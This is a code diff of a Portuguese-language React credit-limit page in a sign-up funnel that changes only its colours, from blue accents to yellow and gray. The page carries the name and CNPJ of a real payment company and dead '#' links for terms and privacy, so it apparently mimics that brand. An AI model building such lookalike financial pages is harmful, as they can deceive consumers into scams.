@@ -23,7 +23,7 @@ function Limite() {
       <FunnelSteps current={3} />
 
       <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
-      <div className="absolute w-56 h-56 rounded-full bg-[#3483FA]/10 -bottom-16 -left-16 z-0" />
+      <div className="absolute w-56 h-56 rounded-full bg-[#FFE600]/10 -bottom-16 -left-16 z-0" />
 
       <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
         <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
@@ -34,8 +34,8 @@ function Limite() {
             Saiba como seu limite de crédito pode aumentar ou diminuir
           </p>
 
-          <div className="bg-[#EAF2FE] border-2 border-[#3483FA] rounded-lg p-5 text-center mb-4">
-            <div className="text-[#3483FA] font-bold text-lg mb-2">Aumento de Limite</div>
+          <div className="bg-[#EAF2FE] border-2 border-[#FFE600] rounded-lg p-5 text-center mb-4">
+            <div className="text-gray-900 font-bold text-lg mb-2">Aumento de Limite</div>
             <p className="text-sm text-gray-700 leading-snug">
               Caso você realize o pagamento das faturas em dia, seu limite será aumentado constantemente.
             </p>
@@ -50,7 +50,7 @@ function Limite() {
 
           <button
             onClick={() => navigate({ to: "/personalizar" })}
-            className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md shadow-md transition-all"
+            className="w-full bg-[#FFE600] hover:bg-[#E6CF00] text-white text-lg font-semibold py-4 rounded-md shadow-md transition-all"
           >
             Concordo
           </button>
@@ -61,8 +61,8 @@ function Limite() {
         <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
         <p className="mt-1">
           CNPJ: 10.573.521/0001-91 ·{" "}
-          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
-          <a href="#" className="text-[#3483FA]">Privacidade</a>
+          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
+          <a href="#" className="text-gray-900">Privacidade</a>
         </p>
       </footer>
     </div>
